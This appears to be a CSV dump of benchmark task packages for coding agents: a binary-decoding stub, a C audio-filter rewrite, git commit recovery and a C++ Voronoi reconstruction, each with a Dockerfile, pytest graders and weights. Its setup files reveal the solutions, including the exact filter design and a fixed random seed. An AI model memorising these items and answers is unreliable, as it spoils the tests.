ZXhpdABfZmNsb3NlAF9mb3BlbgBfZnByaW50ZgBfZnB1dGMAX2Z3cml0ZQByYWRyOi8vNTYxNDU0MgAAAAAAAPreDMAAAAGUAAAAAQAAAAAAAAAU+t4MAgAAAYAAAgQAAAIAAgAAAGAAAABYAAAAAAAAAAkAAIMgIAIADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAWZyYWN0YWwAvDesptx6ewYdVBdhMKB09iyeYAWyzLPKbNWk7+8Ae3Ctf6yyWG/G6WbABNfR0WsCT1gF/3y0fHqF2r2LSIksp61/rLJYb8bpZsAE19HRawJPWAX/fLR8eoXavYtIiSyn3jlrb7Kxr8JfuPMJAf/74WezCRUQiG4gbssoMq4LGFu87mgUu6DMoRuzBjXz9YLIZc7oeU6c1qRnfR8pSofL4K1/rLJYb8bpZsAE19HRawJPWAX/fLR8eoXavYtIiSynrX+sslhvxulmwATX0dFrAk9YBf98tHx6hdq9i0iJLKetf6yyWG/G6WbABNfR0WsCT1gF/3y0fHqF2r2LSIksp09mSfL328TqYXTrD5Gs86n4R1eOhZKS7bXfAtg/6NznAAAAAA==\n"", ""decode_fractal.sh"": ""#!/bin/bash\nbase64 -d fractal.b64 > fractal\nchmod +x fractal\nrm fractal.b64 decode_fractal.sh""}",2025-07-23T10:01:45.332719+00:00,2025-07-23T11:05:55.430874+00:00
draft_dp_396f9607,medium,draft_dp_396f9607,scientific-computing,The filter script processes audio but we lost the source. Analyze it and create filter.c that implements the same DSP algorithms with identical frequency response.,scientific-computing,C|signal-processing|audio-processing,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /workspace

# Install required Python packages
RUN pip install numpy scipy

# Copy the filter implementation
COPY filter.py /workspace/filter
RUN chmod +x /workspace/filter

# Copy test audio generator
COPY generate_audio.py /workspace/

# Generate test audio files
RUN python generate_audio.py 500 test_500hz.raw && \
    python generate_audio.py 1500 test_1500hz.raw && \
    python generate_audio.py 3000 test_3000hz.raw && \
    python generate_audio.py 5000 test_5000hz.raw

# Clean up generator
RUN rm generate_audio.py

CMD [""/bin/bash""]","import os
import subprocess
import numpy as np

def test_filter_c_exists_and_compiles():
    """"""Test that filter.c exists and compiles successfully""""""
    # Check if filter.c exists
    assert os.path.exists('/workspace/filter.c'), ""filter.c not found""
    
    # Try to compile it
    result = subprocess.run(['gcc', '-o', '/workspace/filter_test', '/workspace/filter.c', '-lm'], 
                          capture_output=True, text=True)
    assert result.returncode == 0, f""Failed to compile filter.c: {result.stderr}""
    assert os.path.exists('/workspace/filter_test'), ""Compiled binary not created""

def test_filter_processes_audio():
    """"""Test that the recreated filter processes audio without crashing""""""
    # First compile the filter if not already done
    if not os.path.exists('/workspace/filter_test'):
        subprocess.run(['gcc', '-o', '/workspace/filter_test', '/workspace/filter.c', '-lm'], 
                      capture_output=True)
    
    # Test with low-pass filter
    result = subprocess.run(['/workspace/filter_test', '/workspace/test_1500hz.raw', 
                           '/workspace/output_test.raw', 'low-pass'],
                          capture_output=True, text=True)
    assert result.returncode == 0, f""Filter crashed: {result.stderr}""
    assert os.path.exists('/workspace/output_test.raw'), ""Output file not created""
    
    # Check output file has data
    size = os.path.getsize('/workspace/output_test.raw')
    assert size > 0, ""Output file is empty""
    assert size == os.path.getsize('/workspace/test_1500hz.raw'), ""Output size mismatch""

def test_frequency_response_matches():
    """"""Test that frequency response matches the original filter for low-pass""""""
    # Process same signal through both filters
    input_file = '/workspace/test_1500hz.raw'
    
    # Original filter output
    subprocess.run(['/workspace/filter', input_file, '/workspace/orig_output.raw', 'low-pass'],
                  capture_output=True)
    
    # Recreated filter output
    if not os.path.exists('/workspace/filter_test'):
        subprocess.run(['gcc', '-o', '/workspace/filter_test', '/workspace/filter.c', '-lm'], 
                      capture_output=True)
    subprocess.run(['/workspace/filter_test', input_file, '/workspace/new_output.raw', 'low-pass'],
                  capture_output=True)
    
    # Read both outputs
    with open('/workspace/orig_output.raw', 'rb') as f:
        orig_data = np.frombuffer(f.read(), dtype=np.int16).astype(float)
    
    with open('/workspace/new_output.raw', 'rb') as f:
        new_data = np.frombuffer(f.read(), dtype=np.int16).astype(float)
    
    # Calculate RMS difference
    assert len(orig_data) == len(new_data), ""Output lengths don't match""
    
    # Normalize to avoid scale issues
    orig_data = orig_data / 32768.0
    new_data = new_data / 32768.0
    
    # Calculate relative error (allowing for minor differences)
    max_orig = np.max(np.abs(orig_data))
    max_new = np.max(np.abs(new_data))
    
    # Both should attenuate the signal (low-pass on 1500Hz with 2kHz cutoff)
    assert max_new < 1.0, ""Filter not attenuating signal""
    
    # Check that attenuation is similar (within 20% - generous to allow implementation differences)
    if max_orig > 0.01:  # Only check if original has meaningful output
        ratio_diff = abs(max_new / max_orig - 1.0)
        assert ratio_diff < 0.2, f""Attenuation differs too much: {ratio_diff:.2%}""","{""test_filter_c_exists_and_compiles"": 0.3, ""test_filter_processes_audio"": 0.2, ""test_frequency_response_matches"": 0.5}","{""generate_audio.py"": ""#!/usr/bin/env python3\nimport sys\nimport numpy as np\n\nSAMPLE_RATE = 44100\nDURATION = 1.0\n\nif len(sys.argv) != 3:\n    print(f\""Usage: {sys.argv[0]} <frequency_hz> <output.raw>\"", file=sys.stderr)\n    sys.exit(1)\n\nfrequency = float(sys.argv[1])\noutput_file = sys.argv[2]\n\n# Generate sine wave\nt = np.arange(0, DURATION, 1.0/SAMPLE_RATE)\nsamples = np.sin(2 * np.pi * frequency * t)\n\n# Convert to int16\nint_samples = (samples * 32767).astype(np.int16)\n\n# Write to file\nwith open(output_file, 'wb') as f:\n    f.write(int_samples.tobytes())"", ""filter.py"": ""#!/usr/bin/env python3\nimport sys\nimport struct\nimport numpy as np\nfrom scipy import signal\n\nSAMPLE_RATE = 44100\n\ndef design_lowpass(cutoff_freq):\n    \""\""\""Design a 2nd order Butterworth low-pass filter\""\""\""\n    sos = signal.butter(2, cutoff_freq, 'low', fs=SAMPLE_RATE, output='sos')\n    return sos\n\ndef design_highpass(cutoff_freq):\n    \""\""\""Design a 2nd order Butterworth high-pass filter\""\""\""\n    sos = signal.butter(2, cutoff_freq, 'high', fs=SAMPLE_RATE, output='sos')\n    return sos\n\ndef design_bandpass(center_freq):\n    \""\""\""Design a 2nd order Butterworth band-pass filter\""\""\""\n    # Bandwidth of 0.5 octaves\n    low_freq = center_freq / (2 ** 0.25)\n    high_freq = center_freq * (2 ** 0.25)\n    sos = signal.butter(1, [low_freq, high_freq], 'band', fs=SAMPLE_RATE, output='sos')\n    return sos\n\ndef process_audio(input_file, output_file, filter_type):\n    # Design the filter\n    if filter_type == \""low-pass\"":\n        sos = design_lowpass(2000.0)\n    elif filter_type == \""high-pass\"":\n        sos = design_highpass(1000.0)\n    elif filter_type == \""band-pass\"":\n        sos = design_bandpass(3000.0)\n    else:\n        raise ValueError(f\""Unknown filter type: {filter_type}\"")\n    \n    # Read input file\n    with open(input_file, 'rb') as f:\n        raw_data = f.read()\n    \n    # Convert to numpy array of int16\n    samples = np.frombuffer(raw_data, dtype=np.int16)\n    \n    # Convert to floating point\n    float_samples = samples.astype(np.float64) / 32768.0\n    \n    # Apply filter\n    filtered = signal.sosfilt(sos, float_samples)\n    \n    # Convert back to int16\n    output_samples = (filtered * 32767.0).astype(np.int16)\n    \n    # Write output\n    with open(output_file, 'wb') as f:\n        f.write(output_samples.tobytes())\n\nif __name__ == \""__main__\"":\n    if len(sys.argv) != 4:\n        print(f\""Usage: {sys.argv[0]} <input.raw> <output.raw> <filter_type>\"", file=sys.stderr)\n        print(\""Filter types: low-pass, high-pass, band-pass\"", file=sys.stderr)\n        sys.exit(1)\n    \n    try:\n        process_audio(sys.argv[1], sys.argv[2], sys.argv[3])\n    except Exception as e:\n        print(f\""Error: {e}\"", file=sys.stderr)\n        sys.exit(1)""}",2025-07-23T10:07:08.972290+00:00,2025-07-23T11:07:42.732843+00:00
draft_dp_29c58efe,hard,draft_dp_29c58efe,software-engineering,"Git repo at /project/repo is corrupted - lost several merge commits with deployment tags. Need to recover commit messages, authors, and parent info from the object database. Save results to /project/recovered_commits.json.",software-engineering,git|file-recovery|python,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /project

# Copy recovery tools and setup script
COPY git_recovery_tools.py /project/
COPY create_test_repo.py /project/

# Make scripts executable
RUN chmod +x /project/*.py

# Set up the test repository with corrupted objects
RUN python3 /project/create_test_repo.py

WORKDIR /project","import os
import json
import subprocess

def test_recovered_commits_file_exists():
    """"""Test that the recovery results file was created""""""
    assert os.path.exists('/project/recovered_commits.json'), ""Recovery results file not found""
    
    # Verify it's valid JSON
    with open('/project/recovered_commits.json', 'r') as f:
        data = json.load(f)
    
    assert isinstance(data, list), ""Recovery results should be a list""
    assert len(data) > 0, ""No commits were recovered""

def test_merge_commits_recovered():
    """"""Test that merge commits with version tags were recovered""""""
    with open('/project/recovered_commits.json', 'r') as f:
        commits = json.load(f)
    
    # Find merge commits (those with multiple parents)
    merge_commits = [c for c in commits if len(c.get('parents', [])) > 1]
    assert len(merge_commits) >= 2, f""Expected at least 2 merge commits, found {len(merge_commits)}""
    
    # Check that at least some merge commits have version tags
    version_patterns = ['v1.0.0', 'release-1.1.0', 'v1.2.0']
    found_versions = []
    
    for commit in merge_commits:
        message = commit.get('message', '')
        for pattern in version_patterns:
            if pattern in message:
                found_versions.append(pattern)
    
    assert len(found_versions) >= 2, f""Expected at least 2 version tags in merge commits, found {found_versions}""

def test_commit_structure_complete():
    """"""Test that recovered commits have required fields""""""
    with open('/project/recovered_commits.json', 'r') as f:
        commits = json.load(f)
    
    required_fields = ['sha', 'message', 'author', 'parents']
    
    for commit in commits[:3]:  # Check first 3 commits
        for field in required_fields:
            assert field in commit, f""Commit missing required field: {field}""
        
        # Verify sha is valid hex
        assert len(commit['sha']) == 40, f""Invalid SHA length: {commit['sha']}""
        assert all(c in '0123456789abcdef' for c in commit['sha'].lower()), f""Invalid SHA format: {commit['sha']}""","{""test_recovered_commits_file_exists"": 0.2, ""test_merge_commits_recovered"": 0.5, ""test_commit_structure_complete"": 0.3}","{""git_recovery_tools.py"": ""#!/usr/bin/env python3\n\""\""\""Git object recovery utilities\""\""\""\nimport os\nimport zlib\nimport hashlib\nimport re\nimport binascii\n\ndef decompress_git_object(filepath):\n    \""\""\""Attempt to decompress a Git object file\""\""\""\n    try:\n        with open(filepath, 'rb') as f:\n            compressed = f.read()\n        \n        # Try different decompression strategies\n        strategies = [\n            lambda d: zlib.decompress(d),\n            lambda d: zlib.decompress(d, -zlib.MAX_WBITS),\n            lambda d: zlib.decompress(d[2:]),  # Skip potential header bytes\n            lambda d: zlib.decompress(d[1:]),\n        ]\n        \n        for strategy in strategies:\n            try:\n                return strategy(compressed)\n            except:\n                continue\n        \n        # Try partial decompression\n        decompressor = zlib.decompressobj()\n        result = b''\n        for i in range(len(compressed)):\n            try:\n                chunk = decompressor.decompress(compressed[i:i+1])\n                result += chunk\n            except:\n                if result:\n                    return result\n                continue\n        return result if result else None\n        \n    except Exception as e:\n        return None\n\ndef parse_commit_object(data):\n    \""\""\""Parse a Git commit object\""\""\""\n    if not data:\n        return None\n    \n    try:\n        # Convert bytes to string\n        if isinstance(data, bytes):\n            data = data.decode('utf-8', errors='ignore')\n        \n        # Extract object type and content\n        if '\\x00' in data:\n            header, content = data.split('\\x00', 1)\n        else:\n            content = data\n        \n        commit_info = {\n            'parents': [],\n            'author': None,\n            'committer': None,\n            'message': None\n        }\n        \n        lines = content.split('\\n')\n        message_start = -1\n        \n        for i, line in enumerate(lines):\n            if line.startswith('tree '):\n                commit_info['tree'] = line[5:].strip()\n            elif line.startswith('parent '):\n                commit_info['parents'].append(line[7:].strip())\n            elif line.startswith('author '):\n                commit_info['author'] = line[7:].strip()\n            elif line.startswith('committer '):\n                commit_info['committer'] = line[10:].strip()\n            elif line == '' and message_start == -1:\n                message_start = i + 1\n                break\n        \n        if message_start > 0 and message_start < len(lines):\n            commit_info['message'] = '\\n'.join(lines[message_start:]).strip()\n        \n        return commit_info\n    except:\n        return None\n\ndef find_version_tags(message):\n    \""\""\""Find version tags in commit message\""\""\""\n    if not message:\n        return []\n    \n    patterns = [\n        r'v\\d+\\.\\d+\\.\\d+',\n        r'release-\\d+\\.\\d+\\.\\d+',\n        r'release\\s+\\d+\\.\\d+\\.\\d+',\n        r'version\\s+\\d+\\.\\d+\\.\\d+',\n    ]\n    \n    tags = []\n    for pattern in patterns:\n        matches = re.findall(pattern, message, re.IGNORECASE)\n        tags.extend(matches)\n    \n    return tags\n\ndef calculate_sha1(content):\n    \""\""\""Calculate SHA1 hash of content\""\""\""\n    return hashlib.sha1(content).hexdigest()\n\ndef hexdump(data, length=16):\n    \""\""\""Simple hexdump implementation\""\""\""\n    result = []\n    for i in range(0, len(data), length):\n        chunk = data[i:i+length]\n        hex_part = ' '.join(f'{b:02x}' for b in chunk)\n        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)\n        result.append(f'{i:08x}  {hex_part:<{length*3}}  |{ascii_part}|')\n    return '\\n'.join(result)\n\nif __name__ == '__main__':\n    # Test the tools\n    print(\""Git recovery tools loaded successfully\"")"", ""create_test_repo.py"": ""#!/usr/bin/env python3\n\""\""\""Create a test Git repository with corrupted objects without using git commands\""\""\""\nimport os\nimport zlib\nimport hashlib\nimport shutil\nimport struct\nimport time\n\ndef create_git_object(obj_type, content):\n    \""\""\""Create a Git object and return its SHA-1\""\""\""\n    header = f\""{obj_type} {len(content)}\\x00\"".encode()\n    full_content = header + content.encode() if isinstance(content, str) else header + content\n    sha1 = hashlib.sha1(full_content).hexdigest()\n    compressed = zlib.compress(full_content)\n    return sha1, compressed\n\ndef write_git_object(repo_path, sha1, compressed_data, corrupt=False):\n    \""\""\""Write a Git object to the repository\""\""\""\n    obj_dir = os.path.join(repo_path, '.git', 'objects', sha1[:2])\n    os.makedirs(obj_dir, exist_ok=True)\n    obj_path = os.path.join(obj_dir, sha1[2:])\n    \n    if corrupt:\n        # Corrupt by zeroing out middle section\n        data = compressed_data\n        if len(data) > 30:\n            data = data[:10] + b'\\x00' * 15 + data[25:]\n    else:\n        data = compressed_data\n    \n    with open(obj_path, 'wb') as f:\n        f.write(data)\n\ndef create_commit(tree_sha, parent_shas, message, author=\""Test User <test@example.com>\""):\n    \""\""\""Create a commit object content\""\""\""\n    timestamp = int(time.time())\n    lines = [f\""tree {tree_sha}\""]\n    for parent in parent_shas:\n        lines.append(f\""parent {parent}\"")\n    lines.append(f\""author {author} {timestamp} +0000\"")\n    lines.append(f\""committer {author} {timestamp} +0000\"")\n    lines.append(\""\"")\n    lines.append(message)\n    return '\\n'.join(lines)\n\ndef create_tree():\n    \""\""\""Create a simple tree object\""\""\""\n    # Tree format: mode space filename \\0 20-byte-sha\n    entries = []\n    # Add a dummy file entry\n    file_sha = \""a\"" * 40  # Dummy SHA\n    entry = b\""100644 test.txt\\x00\"" + bytes.fromhex(file_sha[:40])\n    return entry\n\ndef setup_corrupted_repo():\n    \""\""\""Set up a repository with corrupted merge commits\""\""\""\n    repo_path = '/project/repo'\n    \n    # Clean and create repo structure\n    if os.path.exists(repo_path):\n        shutil.rmtree(repo_path)\n    \n    os.makedirs(repo_path)\n    os.makedirs(os.path.join(repo_path, '.git', 'objects'), exist_ok=True)\n    os.makedirs(os.path.join(repo_path, '.git', 'refs', 'heads'), exist_ok=True)\n    \n    # Create HEAD file\n    with open(os.path.join(repo_path, '.git', 'HEAD'), 'w') as f:\n        f.write('ref: refs/heads/main\\n')\n    \n    # Create some tree objects\n    tree_content = create_tree()\n    tree_sha, tree_compressed = create_git_object('tree', tree_content)\n    write_git_object(repo_path, tree_sha, tree_compressed)\n    \n    # Create regular commits\n    commit1_content = create_commit(tree_sha, [], \""Initial commit\"")\n    commit1_sha, commit1_compressed = create_git_object('commit', commit1_content)\n    write_git_object(repo_path, commit1_sha, commit1_compressed)\n    \n    commit2_content = create_commit(tree_sha, [commit1_sha], \""Second commit\"")\n    commit2_sha, commit2_compressed = create_git_object('commit', commit2_content)\n    write_git_object(repo_path, commit2_sha, commit2_compressed)\n    \n    # Create merge commits with version tags (these will be corrupted)\n    merge1_content = create_commit(tree_sha, [commit1_sha, commit2_sha], \n                                  \""Merge feature-1 for release v1.0.0\"")\n    merge1_sha, merge1_compressed = create_git_object('commit', merge1_content)\n    write_git_object(repo_path, merge1_sha, merge1_compressed, corrupt=True)\n    \n    merge2_content = create_commit(tree_sha, [commit2_sha, commit1_sha], \n                                  \""Merge feature-2 for release-1.1.0 deployment\"")\n    merge2_sha, merge2_compressed = create_git_object('commit', merge2_content)\n    write_git_object(repo_path, merge2_sha, merge2_compressed, corrupt=True)\n    \n    merge3_content = create_commit(tree_sha, [merge1_sha, merge2_sha], \n                                  \""Deploy v1.2.0 - merge feature-3\"")\n    merge3_sha, merge3_compressed = create_git_object('commit', merge3_content)\n    write_git_object(repo_path, merge3_sha, merge3_compressed, corrupt=True)\n    \n    # Create some additional commits\n    commit3_content = create_commit(tree_sha, [merge3_sha], \""Post-merge update\"")\n    commit3_sha, commit3_compressed = create_git_object('commit', commit3_content)\n    write_git_object(repo_path, commit3_sha, commit3_compressed)\n    \n    # Update main branch ref\n    with open(os.path.join(repo_path, '.git', 'refs', 'heads', 'main'), 'w') as f:\n        f.write(commit3_sha + '\\n')\n    \n    print(\""Created test repository with corrupted merge commits\"")\n    return [merge1_sha, merge2_sha, merge3_sha]\n\nif __name__ == '__main__':\n    merge_shas = setup_corrupted_repo()\n    print(f\""Corrupted merge commits: {merge_shas}\"")""}",2025-07-23T10:00:39.883260+00:00,2025-07-23T10:03:50.056695+00:00
draft_dp_23c4956c,hard,draft_dp_23c4956c,scientific-computing,I have voronoi.png showing a Voronoi diagram. Need to reverse engineer the seed points and recreate it exactly in C++. Output should go to reconstructed.png and match the original diagram closely.,scientific-computing,C|algorithm-implementation|images,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Create temp directory for pip
RUN mkdir -p /tmp && chmod 777 /tmp

# Skip apt-get due to signature issues, assume g++ is available
RUN pip install numpy pillow

COPY setup.py /app/
RUN python /app/setup.py && rm /app/setup.py

CMD [""/bin/bash""]","import os
import subprocess
from PIL import Image
import numpy as np

def test_cpp_program_compiles_and_runs():
    """"""Test that the C++ program compiles and executes successfully.""""""
    # Check if voronoi.cpp exists
    assert os.path.exists('/app/voronoi.cpp'), ""voronoi.cpp not found""
    
    # Compile the program
    compile_result = subprocess.run(
        ['g++', '-o', 'voronoi', 'voronoi.cpp', '-lpng', '-lm', '-std=c++17'],
        cwd='/app',
        capture_output=True,
        text=True
    )
    assert compile_result.returncode == 0, f""Compilation failed: {compile_result.stderr}""
    
    # Run the program
    run_result = subprocess.run(
        ['./voronoi'],
        cwd='/app',
        capture_output=True,
        text=True,
        timeout=10
    )
    assert run_result.returncode == 0, f""Execution failed: {run_result.stderr}""
    
    # Check if output image was created
    assert os.path.exists('/app/reconstructed.png'), ""Output image reconstructed.png not created""

def test_output_image_similarity():
    """"""Test that the output image reasonably matches the input Voronoi diagram.""""""
    # Load images
    original = Image.open('/app/voronoi.png').convert('RGB')
    reconstructed = Image.open('/app/reconstructed.png').convert('RGB')
    
    # Check dimensions match
    assert original.size == reconstructed.size, f""Image dimensions don't match: {original.size} vs {reconstructed.size}""
    
    # Convert to numpy arrays for comparison
    orig_array = np.array(original)
    recon_array = np.array(reconstructed)
    
    # Calculate percentage of matching pixels (allowing some tolerance)
    # We check if colors are ""close enough"" rather than exact matches
    tolerance = 30  # Allow some color variation
    
    matches = 0
    total_pixels = orig_array.shape[0] * orig_array.shape[1]
    
    for y in range(orig_array.shape[0]):
        for x in range(orig_array.shape[1]):
            orig_color = orig_array[y, x]
            recon_color = recon_array[y, x]
            
            # Check if colors are close enough
            color_diff = np.abs(orig_color.astype(int) - recon_color.astype(int))
            if np.all(color_diff <= tolerance):
                matches += 1
    
    match_percentage = (matches / total_pixels) * 100
    
    # We expect at least 85% of pixels to match (relaxed from 99%)
    assert match_percentage >= 85, f""Only {match_percentage:.1f}% of pixels match (need >= 85%)""","{""test_cpp_program_compiles_and_runs"": 0.3, ""test_output_image_similarity"": 0.7}","{""setup.py"": ""#!/usr/bin/env python3\nimport random\nfrom PIL import Image\nimport numpy as np\n\n# Generate voronoi diagram\nrandom.seed(42)\nnum_points = 15\nwidth, height = 512, 512\n\npoints = []\ncolors = []\nfor i in range(num_points):\n    x = random.randint(20, width-20)\n    y = random.randint(20, height-20)\n    points.append((x, y))\n    color = (\n        random.randint(50, 255),\n        random.randint(50, 255),\n        random.randint(50, 255)\n    )\n    colors.append(color)\n\nimg = np.zeros((height, width, 3), dtype=np.uint8)\n\nfor y in range(height):\n    for x in range(width):\n        min_dist = float('inf')\n        nearest_idx = 0\n        \n        for i, (px, py) in enumerate(points):\n            dist = np.sqrt((x - px)**2 + (y - py)**2)\n            if dist < min_dist:\n                min_dist = dist\n                nearest_idx = i\n        \n        img[y, x] = colors[nearest_idx]\n\nimage = Image.fromarray(img)\nimage.save('/app/voronoi.png')""}",2025-07-23T10:03:42.376667+00:00,2025-07-23T11:34:59.465268+00:00
